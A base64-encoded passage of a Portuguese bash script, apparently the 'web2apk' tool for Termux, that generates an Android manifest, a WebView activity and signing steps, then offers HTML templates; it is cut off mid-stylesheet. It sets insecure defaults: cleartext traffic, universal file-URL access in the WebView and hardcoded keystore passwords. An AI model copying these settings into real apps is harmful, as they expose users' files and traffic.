KUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIFsgLW4gIiRTUkNfRElSIiBdICYmIFsgLWQgIiRTUkNfRElSIiBdICYmIHsKICAgIGNwIC1yICIkU1JDX0RJUiIvLiAiJEJVSUxEL2Fzc2V0cy93d3cvIgogICAgX2luZm8gIkFzc2V0cyBjb3BpYWRvcyAoJChmaW5kICIkQlVJTEQvYXNzZXRzL3d3dyIgLXR5cGUgZiB8IHdjIC1sKSBhcnF1aXZvcykiCiAgfQoKICAjIOKUgOKUgCBzdHJpbmdzLnhtbCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBleHBvcnQgVzJBX0FQUD0iJEFQUF9OQU1FIiBXMkFfQlVJTEQ9IiRCVUlMRCIKICBweXRob24zIC1jICIKaW1wb3J0IHN5cywgb3MKYXBwID0gb3MuZW52aXJvbi5nZXQoJ1cyQV9BUFAnLCdBcHAnKQpvdXQgPSBvcy5lbnZpcm9uLmdldCgnVzJBX0JVSUxEJywnJykgKyAnL3Jlcy92YWx1ZXMvc3RyaW5ncy54bWwnCiMgRXNjYXBhciBjYXJhY3RlcmVzIGVzcGVjaWFpcyBYTUwKYXBwID0gYXBwLnJlcGxhY2UoJyYnLCcmYW1wOycpLnJlcGxhY2UoJzwnLCcmbHQ7JykucmVwbGFjZSgnPicsJyZndDsnKS5yZXBsYWNlKCdcIicsJyZxdW90OycpCm9wZW4ob3V0LCd3Jykud3JpdGUoJzw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cInV0Zi04XCI/PlxuPHJlc291cmNlcz5cbiAgICA8c3RyaW5nIG5hbWU9XCJhcHBfbmFtZVwiPicgKyBhcHAgKyAnPC9zdHJpbmc+XG48L3Jlc291cmNlcz5cbicpCiIKCiAgIyDilIDilIAgbmV0d29ya19zZWN1cml0eV9jb25maWcueG1sIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGNhdCA+ICIkQlVJTEQvcmVzL3htbC9uZXR3b3JrX3NlY3VyaXR5X2NvbmZpZy54bWwiIDw8ICdOU0VPRicKPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPG5ldHdvcmstc2VjdXJpdHktY29uZmlnPgogICAgPGJhc2UtY29uZmlnIGNsZWFydGV4dFRyYWZmaWNQZXJtaXR0ZWQ9InRydWUiPgogICAgICAgIDx0cnVzdC1hbmNob3JzPjxjZXJ0aWZpY2F0ZXMgc3JjPSJzeXN0ZW0iLz48L3RydXN0LWFuY2hvcnM+CiAgICA8L2Jhc2UtY29uZmlnPgo8L25ldHdvcmstc2VjdXJpdHktY29uZmlnPgpOU0VPRgoKICAjIOKUgOKUgCBQZXJtaXNzw7VlcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBsb2NhbCBQRVJNU19MSVNUCiAgUEVSTVNfTElTVD0kKHByaW50ZiAnJXMnICIkUEVSTVMiIHwgdHIgJywnICdcbicgfCB3aGlsZSByZWFkIC1yIHA7IGRvIF9wZXJtX3Jlc29sdmUgIiRwIjsgZG9uZSB8IHNvcnQgLXUgfCB0ciAnXG4nICd8JykKCiAgIyDilIDilIAgQW5kcm9pZE1hbmlmZXN0LnhtbCB2aWEgUHl0aG9uIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGxvY2FsIE9SSUVOVF9BTkRST0lEPSd1bnNwZWNpZmllZCcKICBjYXNlICIkT1JJRU5UQVRJT04iIGluCiAgICBwb3J0cmFpdCkgIE9SSUVOVF9BTkRST0lEPSdwb3J0cmFpdCcgOzsKICAgIGxhbmRzY2FwZSkgT1JJRU5UX0FORFJPSUQ9J2xhbmRzY2FwZScgOzsKICAgIGF1dG8pICAgICAgT1JJRU5UX0FORFJPSUQ9J2Z1bGxTZW5zb3InIDs7CiAgZXNhYwoKICBleHBvcnQgVzJBX1BLRz0iJFBLR19OQU1FIiBXMkFfVkM9IiRWRVJTSU9OX0NPREUiIFcyQV9WTj0iJFZFUlNJT05fTkFNRSIgXAogICAgICAgICBXMkFfTUlOU0RLPSIkTUlOX1NESyIgVzJBX1RHVFNESz0iJFRBUkdFVF9TREsiIFwKICAgICAgICAgVzJBX09SSUVOVD0iJE9SSUVOVF9BTkRST0lEIiBXMkFfUEVSTVM9IiRQRVJNU19MSVNUIgoKICBweXRob24zIC1jICIKaW1wb3J0IG9zCmJ1aWxkICA9IG9zLmVudmlyb25bJ1cyQV9CVUlMRCddCnBrZyAgICA9IG9zLmVudmlyb25bJ1cyQV9QS0cnXQp2YyAgICAgPSBvcy5lbnZpcm9uWydXMkFfVkMnXQp2biAgICAgPSBvcy5lbnZpcm9uWydXMkFfVk4nXQptaW5zZGsgPSBvcy5lbnZpcm9uWydXMkFfTUlOU0RLJ10KdGd0c2RrID0gb3MuZW52aXJvblsnVzJBX1RHVFNESyddCm9yaWVudCA9IG9zLmVudmlyb25bJ1cyQV9PUklFTlQnXQpwZXJtcyAgPSBbcCBmb3IgcCBpbiBvcy5lbnZpcm9uWydXMkFfUEVSTVMnXS5zcGxpdCgnfCcpIGlmIHBdCnB4bWwgICA9ICcnLmpvaW4oJyAgICA8dXNlcy1wZXJtaXNzaW9uIGFuZHJvaWQ6bmFtZT1cIicgKyBwICsgJ1wiLz5cbicgZm9yIHAgaW4gcGVybXMpCnhtbCAgICA9ICgnPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwidXRmLThcIj8+XG4nCiAgICAgICAgICAnPG1hbmlmZXN0IHhtbG5zOmFuZHJvaWQ9XCJodHRwOi8vc2NoZW1hcy5hbmRyb2lkLmNvbS9hcGsvcmVzL2FuZHJvaWRcIlxuJwogICAgICAgICAgJyAgICBwYWNrYWdlPVwiJyArIHBrZyArICdcIlxuJwogICAgICAgICAgJyAgICBhbmRyb2lkOnZlcnNpb25Db2RlPVwiJyArIHZjICsgJ1wiXG4nCiAgICAgICAgICAnICAgIGFuZHJvaWQ6dmVyc2lvbk5hbWU9XCInICsgdm4gKyAnXCI+XG4nCiAgICAgICAgICAnICAgIDx1c2VzLXNkayBhbmRyb2lkOm1pblNka1ZlcnNpb249XCInICsgbWluc2RrICsgJ1wiIGFuZHJvaWQ6dGFyZ2V0U2RrVmVyc2lvbj1cIicgKyB0Z3RzZGsgKyAnXCIvPlxuJwogICAgICAgICAgKyBweG1sICsKICAgICAgICAgICcgICAgPGFwcGxpY2F0aW9uIGFuZHJvaWQ6bGFiZWw9XCJAc3RyaW5nL2FwcF9uYW1lXCIgYW5kcm9pZDppY29uPVwiQGRyYXdhYmxlL2ljb25cIlxuJwogICAgICAgICAgJyAgICAgICAgYW5kcm9pZDpoYXJkd2FyZUFjY2VsZXJhdGVkPVwidHJ1ZVwiIGFuZHJvaWQ6dXNlc0NsZWFydGV4dFRyYWZmaWM9XCJ0cnVlXCJcbicKICAgICAgICAgICcgICAgICAgIGFuZHJvaWQ6bmV0d29ya1NlY3VyaXR5Q29uZmlnPVwiQHhtbC9uZXR3b3JrX3NlY3VyaXR5X2NvbmZpZ1wiPlxuJwogICAgICAgICAgJyAgICAgICAgPGFjdGl2aXR5IGFuZHJvaWQ6bmFtZT1cIi5XZWJBY3Rpdml0eVwiIGFuZHJvaWQ6ZXhwb3J0ZWQ9XCJ0cnVlXCJcbicKICAgICAgICAgICcgICAgICAgICAgICBhbmRyb2lkOnNjcmVlbk9yaWVudGF0aW9uPVwiJyArIG9yaWVudCArICdcIlxuJwogICAgICAgICAgJyAgICAgICAgICAgIGFuZHJvaWQ6Y29uZmlnQ2hhbmdlcz1cIm9yaWVudGF0aW9ufHNjcmVlblNpemV8a2V5Ym9hcmRIaWRkZW5cIj5cbicKICAgICAgICAgICcgICAgICAgICAgICA8aW50ZW50LWZpbHRlcj5cbicKICAgICAgICAgICcgICAgICAgICAgICAgICAgPGFjdGlvbiBhbmRyb2lkOm5hbWU9XCJhbmRyb2lkLmludGVudC5hY3Rpb24uTUFJTlwiLz5cbicKICAgICAgICAgICcgICAgICAgICAgICAgICAgPGNhdGVnb3J5IGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmNhdGVnb3J5LkxBVU5DSEVSXCIvPlxuJwogICAgICAgICAgJyAgICAgICAgICAgIDwvaW50ZW50LWZpbHRlcj5cbicKICAgICAgICAgICcgICAgICAgIDwvYWN0aXZpdHk+XG4nCiAgICAgICAgICAnICAgIDwvYXBwbGljYXRpb24+XG4nCiAgICAgICAgICAnPC9tYW5pZmVzdD5cbicpCm9wZW4oYnVpbGQgKyAnL0FuZHJvaWRNYW5pZmVzdC54bWwnLCAndycpLndyaXRlKHhtbCkKcHJpbnQoJyAgTWFuaWZlc3Q6ICcgKyBidWlsZCArICcvQW5kcm9pZE1hbmlmZXN0LnhtbCcpCiIKCiAgIyDilIDilIAgV2ViQWN0aXZpdHkuamF2YSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBsb2NhbCBKQVZBX0ZTIEpBVkFfVEhFTUUgSkFWQV9MT0FECiAgWyAiJEZVTExTQ1JFRU4iIC1lcSAxIF0gXAogICAgJiYgSkFWQV9GUz0nICAgICAgICByZXF1ZXN0V2luZG93RmVhdHVyZShhbmRyb2lkLnZpZXcuV2luZG93LkZFQVRVUkVfTk9fVElUTEUpOyBnZXRXaW5kb3coKS5zZXRGbGFncyhhbmRyb2lkLnZpZXcuV2luZG93TWFuYWdlci5MYXlvdXRQYXJhbXMuRkxBR19GVUxMU0NSRUVOLCBhbmRyb2lkLnZpZXcuV2luZG93TWFuYWdlci5MYXlvdXRQYXJhbXMuRkxBR19GVUxMU0NSRUVOKTsnIFwKICAgIHx8IEpBVkFfRlM9JyAgICAgICAgLy8gc3RhdHVzIGJhciBub3JtYWwnCiAgY2FzZSAiJFRIRU1FIiBpbgogICAgZGFyaykgICAgICAgIEpBVkFfVEhFTUU9JyAgICAgICAgdy5zZXRCYWNrZ3JvdW5kQ29sb3IoMHhGRjAwMDAwMCk7JyA7OwogICAgdHJhbnNwYXJlbnQpIEpBVkFfVEhFTUU9JyAgICAgICAgdy5zZXRCYWNrZ3JvdW5kQ29sb3IoMHgwMDAwMDAwMCk7JyA7OwogICAgKikgICAgICAgICAgIEpBVkFfVEhFTUU9JyAgICAgICAgLy8gZnVuZG8gcGFkcmFvJyA7OwogIGVzYWMKICBbIC1uICIkTE9BRF9VUkwiIF0gJiYgSkFWQV9MT0FEPSIkTE9BRF9VUkwiIFwKICAgICAgICAgICAgICAgICAgICAgfHwgSkFWQV9MT0FEPSdmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3L2luZGV4Lmh0bWwnCgogIGNhdCA+ICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiA8PCBKQVZBRU9GCnBhY2thZ2UgJFBLR19OQU1FOwppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHk7CmltcG9ydCBhbmRyb2lkLm9zLkJ1bmRsZTsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlNldHRpbmdzOwppbXBvcnQgYW5kcm9pZC53ZWJraXQuV2ViVmlldzsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlZpZXdDbGllbnQ7CnB1YmxpYyBjbGFzcyBXZWJBY3Rpdml0eSBleHRlbmRzIEFjdGl2aXR5IHsKICAgIHByaXZhdGUgV2ViVmlldyB3OwogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lkIG9uQ3JlYXRlKEJ1bmRsZSBiKSB7CiAgICAgICAgc3VwZXIub25DcmVhdGUoYik7CiRKQVZBX0ZTCiAgICAgICAgdyA9IG5ldyBXZWJWaWV3KHRoaXMpOwokSkFWQV9USEVNRQogICAgICAgIHNldENvbnRlbnRWaWV3KHcpOwogICAgICAgIFdlYlNldHRpbmdzIHMgPSB3LmdldFNldHRpbmdzKCk7CiAgICAgICAgcy5zZXRKYXZhU2NyaXB0RW5hYmxlZCh0cnVlKTsgcy5zZXREb21TdG9yYWdlRW5hYmxlZCh0cnVlKTsKICAgICAgICBzLnNldEFsbG93RmlsZUFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsgcy5zZXRBbGxvd1VuaXZlcnNhbEFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsKICAgICAgICBzLnNldEJ1aWx0SW5ab29tQ29udHJvbHMoZmFsc2UpOyBzLnNldERpc3BsYXlab29tQ29udHJvbHMoZmFsc2UpOwogICAgICAgIHMuc2V0VXNlV2lkZVZpZXdQb3J0KHRydWUpOyBzLnNldExvYWRXaXRoT3ZlcnZpZXdNb2RlKHRydWUpOwogICAgICAgIHcuc2V0V2ViVmlld0NsaWVudChuZXcgV2ViVmlld0NsaWVudCgpKTsKICAgICAgICB3LmxvYWRVcmwoIiRKQVZBX0xPQUQiKTsKICAgIH0KICAgIEBPdmVycmlkZSBwdWJsaWMgdm9pZCBvbkJhY2tQcmVzc2VkKCkgeyBpZiAody5jYW5Hb0JhY2soKSkgdy5nb0JhY2soKTsgZWxzZSBzdXBlci5vbkJhY2tQcmVzc2VkKCk7IH0KICAgIEBPdmVycmlkZSBwcm90ZWN0ZWQgdm9pZCBvblJlc3VtZSgpIHsgc3VwZXIub25SZXN1bWUoKTsgdy5vblJlc3VtZSgpOyB9CiAgICBAT3ZlcnJpZGUgcHJvdGVjdGVkIHZvaWQgb25QYXVzZSgpICB7IHN1cGVyLm9uUGF1c2UoKTsgIHcub25QYXVzZSgpOyAgfQp9CkpBVkFFT0YKCiAgIyDilIDilIAgUGlwZWxpbmUg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgX2luZm8gJ2FhcHQyIGNvbXBpbGUuLi4nCiAgYWFwdDIgY29tcGlsZSAtLWRpciAiJEJVSUxEL3JlcyIgLW8gIiRCVUlMRC9yZXNfY29tcGlsZWQvIiAyPiYxIFwKICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQoKICBfaW5mbyAnYWFwdDIgbGluay4uLicKICBhYXB0MiBsaW5rIC0tbWFuaWZlc3QgIiRCVUlMRC9BbmRyb2lkTWFuaWZlc3QueG1sIiBcCiAgICAtSSAiJFcyQV9KQVIiIC1BICIkQlVJTEQvYXNzZXRzIiBcCiAgICAiJEJVSUxEL3Jlc19jb21waWxlZC8iKi5mbGF0IFwKICAgIC1vICIkQlVJTEQvdW5zaWduZWQuYXBrIiAyPiYxIFwKICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIFsgLWYgIiRCVUlMRC91bnNpZ25lZC5hcGsiIF0gfHwgX2VyciAnYWFwdDIgbGluayBmYWxob3UnCgogIF9pbmZvICdDb21waWxhbmRvIEphdmEuLi4nCiAgbG9jYWwgSkFWQV9DT01QSUxFUgogIGlmICAgY29tbWFuZCAtdiBlY2ogICAgPi9kZXYvbnVsbCAyPiYxOyB0aGVuIEpBVkFfQ09NUElMRVI9J2VjaicKICBlbGlmIGNvbW1hbmQgLXYgamF2YWMgID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdqYXZhYycKICBlbHNlIF9lcnIgJ0NvbXBpbGFkb3IgSmF2YSBuYW8gZW5jb250cmFkby4gSW5zdGFsZTogcGtnIGluc3RhbGwgZWNqJzsgZmkKICBfZGltICJVc2FuZG86ICRKQVZBX0NPTVBJTEVSIgogIGlmIFsgIiRKQVZBX0NPTVBJTEVSIiA9ICdlY2onIF07IHRoZW4KICAgIGVjaiAtc291cmNlIDcgLXRhcmdldCA3IC1jcCAiJFcyQV9KQVIiIFwKICAgICAgIiRCVUlMRC9zcmMvJFBLR19QQVRIL1dlYkFjdGl2aXR5LmphdmEiIFwKICAgICAgLWQgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSBcCiAgICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIGVsc2UKICAgIGphdmFjIC1zb3VyY2UgNyAtdGFyZ2V0IDcgLWNwICIkVzJBX0pBUiIgXAogICAgICAiJEJVSUxEL3NyYy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuamF2YSIgXAogICAgICAtZCAiJEJVSUxEL2NsYXNzZXMvIiAyPiYxIFwKICAgICAgfCBncmVwIC12ICdeJCcgfCB3aGlsZSBJRlM9IHJlYWQgLXIgbDsgZG8gX2RpbSAiJGwiOyBkb25lCiAgZmkKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy8kUEtHX1BBVEgvV2ViQWN0aXZpdHkuY2xhc3MiIF0gfHwgX2VyciAnY29tcGlsYWNhbyBKYXZhIGZhbGhvdScKCiAgX2luZm8gJ2R4ICguY2xhc3MgLT4gLmRleCkuLi4nCiAgZHggLS1kZXggLS1vdXRwdXQ9IiRCVUlMRC9jbGFzc2VzLmRleCIgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSBcCiAgICB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkQlVJTEQvY2xhc3Nlcy5kZXgiIF0gfHwgX2VyciAnZHggZmFsaG91JwoKICBfaW5mbyAnRW1wYWNvdGFuZG8gREVYLi4uJwogIChjZCAiJEJVSUxEIiAmJiB6aXAgLWogdW5zaWduZWQuYXBrIGNsYXNzZXMuZGV4KSA+IC9kZXYvbnVsbAoKICBfaW5mbyAnemlwYWxpZ24uLi4nCiAgemlwYWxpZ24gLWYgNCAiJEJVSUxEL3Vuc2lnbmVkLmFwayIgIiRCVUlMRC9hbGlnbmVkLmFwayIgMj4vZGV2L251bGwKCiAgX2Vuc3VyZV9rZXlzdG9yZQogIGxvY2FsIEtTX0FMSUFTIEtTX1BBU1MKICBpZiBbICIkVzJBX0tTIiA9ICIkSE9NRS8ueHBtL3Rvb2xzL2Fwa3Rvb2wveHBtLWNvbXBhdC10ZXN0LmtleXN0b3JlIiBdOyB0aGVuCiAgICBLU19BTElBUz0neHBtLWNvbXBhdC10ZXN0JzsgS1NfUEFTUz0neHBtLWNvbXBhdC10ZXN0JwogIGVsc2UKICAgIEtTX0FMSUFTPSd3ZWIyYXBrJzsgS1NfUEFTUz0nd2ViMmFway1rZXknCiAgZmkKCiAgX2luZm8gJ2Fwa3NpZ25lci4uLicKICBhcGtzaWduZXIgc2lnbiBcCiAgICAtLWtzICIkVzJBX0tTIiAtLWtzLWtleS1hbGlhcyAiJEtTX0FMSUFTIiBcCiAgICAtLWtzLXBhc3MgcGFzczoiJEtTX1BBU1MiIC0ta2V5LXBhc3MgcGFzczoiJEtTX1BBU1MiIFwKICAgIC0tb3V0ICIkT1VUX0FQSyIgIiRCVUlMRC9hbGlnbmVkLmFwayIgMj4mMSBcCiAgICB8IGdyZXAgLXYgJ14kJyB8IHdoaWxlIElGUz0gcmVhZCAtciBsOyBkbyBfZGltICIkbCI7IGRvbmUKICBbIC1mICIkT1VUX0FQSyIgXSB8fCBfZXJyICdhcGtzaWduZXIgZmFsaG91JwoKICBsb2NhbCBBUEtfU0laRTsgQVBLX1NJWkU9JChkdSAtaCAiJE9VVF9BUEsiIHwgY3V0IC1mMSkKICBwcmludGYgJ1xuXDAzM1sxOzMybSAgPT0gQVBLIHByb250byA9PVwwMzNbMG1cblxuJwogIF9vayAiQXJxdWl2byAgOiAkT1VUX0FQSyAoJEFQS19TSVpFKSIKICBfb2sgIlBhY2thZ2UgIDogJFBLR19OQU1FIgogIF9vayAiVmVyc2FvICAgOiAkVkVSU0lPTl9OQU1FICgkVkVSU0lPTl9DT0RFKSIKICBwcmludGYgJ1xuJwogIF9kaW0gIkluc3RhbGFyIDogdGVybXV4LW9wZW4gJyRPVVRfQVBLJyIKICBwcmludGYgJ1xuJwp9CgpfY21kX3RlbXBsYXRlKCkgewogIGxvY2FsIFRUWVBFPSIkezE6LX0iIE9VVERJUj0iJHsyOi19IgoKICAjIOKUgOKUgCBNZW51IGludGVyYXRpdm8gc2UgbsOjbyBmb2kgcGFzc2FkbyB0aXBvIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGlmIFsgLXogIiRUVFlQRSIgXTsgdGhlbgogICAgcHJpbnRmICJcblwwMzNbMTszNW0gIHdlYjJhcGsgdGVtcGxhdGUg4oCUIEdlcmFyIHByb2pldG8gZGUgZXhlbXBsb1wwMzNbMG1cblxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0xKVwwMzNbMG0gYmFzaWMgICDigJQgSFRNTCArIENTUyArIEpTIHNpbXBsZXMgKGJvYSBwYXJhIGNvbWXDp2FyKVxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0yKVwwMzNbMG0gcHdhICAgICDigJQgUHJvZ3Jlc3NpdmUgV2ViIEFwcCAob2ZmbGluZSwgaW5zdGFsbMOhdmVsKVxuIgogICAgcHJpbnRmICIgIFwwMzNbMTszMm0zKVwwMzNbMG0gZ2FtZSAgICDigJQgSm9nbyBjYW52YXMgc2ltcGxlcyAoU25ha2UpXG4iCiAgICBwcmludGYgIiAgXDAzM1sxOzMybTQpXDAzM1swbSBibGFuayAgIOKAlCBFc3F1ZWxldG8gbcOtbmltbyBzZW0gY29udGXDumRvXG5cbiIKICAgIHByaW50ZiAiICBUaXBvIFsxLTQgb3Ugbm9tZV06ICIKICAgIHJlYWQgLXIgVFRZUEUKICAgIGNhc2UgIiRUVFlQRSIgaW4KICAgICAgMSkgVFRZUEU9ImJhc2ljIiAgOzsKICAgICAgMikgVFRZUEU9InB3YSIgICAgOzsKICAgICAgMykgVFRZUEU9ImdhbWUiICAgOzsKICAgICAgNCkgVFRZUEU9ImJsYW5rIiAgOzsKICAgIGVzYWMKICBmaQoKICBbIC16ICIkT1VURElSIiBdICYmIE9VVERJUj0iLi8ke1RUWVBFfWFwcCIKCiAgaWYgWyAtZCAiJE9VVERJUiIgXSAmJiBbICIkKGxzIC1BICIkT1VURElSIiAyPi9kZXYvbnVsbCkiIF07IHRoZW4KICAgIHByaW50ZiAiXDAzM1sxOzMzbSAgRGlyZXTDs3JpbyAnJXMnIGrDoSBleGlzdGUgZSBuw6NvIGVzdMOhIHZhemlvLlwwMzNbMG1cbiIgIiRPVVRESVIiCiAgICBwcmludGYgIiAgQ29udGludWFyIG1lc21vIGFzc2ltPyBbcy9OXSAiCiAgICByZWFkIC1yIHJlc3AKICAgIFsgIiRyZXNwIiA9ICJzIiBdIHx8IFsgIiRyZXNwIiA9ICJTIiBdIHx8IHsgcHJpbnRmICIgIENhbmNlbGFkby5cblxuIjsgZXhpdCAwOyB9CiAgZmkKCiAgbWtkaXIgLXAgIiRPVVRESVIiCgogIGNhc2UgIiRUVFlQRSIgaW4KICAgIGJhc2ljKSAgX3RwbF9iYXNpYyAgIiRPVVRESVIiIDs7CiAgICBwd2EpICAgIF90cGxfcHdhICAgICIkT1VURElSIiA7OwogICAgZ2FtZSkgICBfdHBsX2dhbWUgICAiJE9VVERJUiIgOzsKICAgIGJsYW5rKSAgX3RwbF9ibGFuayAgIiRPVVRESVIiIDs7CiAgICAqKQogICAgICBwcmludGYgIlwwMzNbMTszMW0gIFRlbXBsYXRlIGRlc2NvbmhlY2lkbzogJXNcMDMzWzBtXG4iICIkVFRZUEUiCiAgICAgIHByaW50ZiAiICBPcMOnw7VlczogYmFzaWMgfCBwd2EgfCBnYW1lIHwgYmxhbmtcblxuIgogICAgICBleGl0IDEgOzsKICBlc2FjCgogIHByaW50ZiAiXG5cMDMzWzE7MzJtICBQcm9qZXRvIGNyaWFkbyBlbTogJXNcMDMzWzBtXG4iICIkT1VURElSIgogIHByaW50ZiAiXDAzM1swOzkwbSAgVGVzdGFyIG5vIGJyb3dzZXIgOiB0ZXJtdXgtb3BlbiAnJXMvaW5kZXguaHRtbCdcMDMzWzBtXG4iICIkT1VURElSIgogIHByaW50ZiAiXDAzM1swOzkwbSAgQnVpbGRhciBBUEsgICAgICAgOiB3ZWIyYXBrIGJ1aWxkICclcycgLS1uYW1lIFwiJXNcIlwwMzNbMG1cblxuIiAiJE9VVERJUiIgIiRUVFlQRSIKfQoKIyDilIDilIAgYmFzaWMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACl90cGxfYmFzaWMoKSB7CiAgbG9jYWwgRD0iJDEiCiAgY2F0ID4gIiREL2luZGV4Lmh0bWwiIDw8ICdIVE1MJwo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0icHQtQlIiPgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iPgogIDx0aXRsZT5NZXUgQXBwPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGhlYWRlcj4KICAgIDxoMSBpZD0iYXBwLXRpdGxlIj5NZXUgQXBwPC9oMT4KICA8L2hlYWRlcj4KICA8bWFpbj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8cD5PbMOhISBFc3RlIMOpIHVtIHRlbXBsYXRlIGLDoXNpY28gZ2VyYWRvIHBlbG8gPHN0cm9uZz53ZWIyYXBrPC9zdHJvbmc+LjwvcD4KICAgICAgPHAgaWQ9ImNvdW50ZXItbGFiZWwiPlZvY8OqIGNsaWNvdSA8c3BhbiBpZD0iY291bnQiPjA8L3NwYW4+IHZleihlcykuPC9wPgogICAgICA8YnV0dG9uIGlkPSJidG4iPkNsaXF1ZSBhcXVpPC9idXR0b24+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiIGlkPSJpbmZvLWNhcmQiPgogICAgICA8cCBpZD0iaW5mby10ZXh0Ij5BZ3VhcmRhbmRvIGludGVyYcOnw6NvLi4uPC9wPgogICAgPC9kaXY+CiAgPC9tYWluPgogIDxzY3JpcHQgc3JjPSJzY3JpcHQuanMiPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4KSFRNTAoKICBjYXQgPiAiJEQvc3R5bGUuY3NzIiA8PCAnQ1NTJwo6cm9vdCB7CiAgLS1iZzogICAgICAjMGYxMTE3OwogIC0tc3VyZmFjZTogIzFhMWQyNzsKICAtLWFjY2VudDogICMxYTczZTg7CiAgLS10ZXh0OiAgICAjZThlYWYwOwogIC0tbXV0ZWQ6ICAgIzhhOGZhODsKICAtLXJhZGl1czogIDE0cHg7Cn0KKiB7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgfQpib2R5IHsKICBiYWNrZ3JvdW5kOiB2YXIoLS1i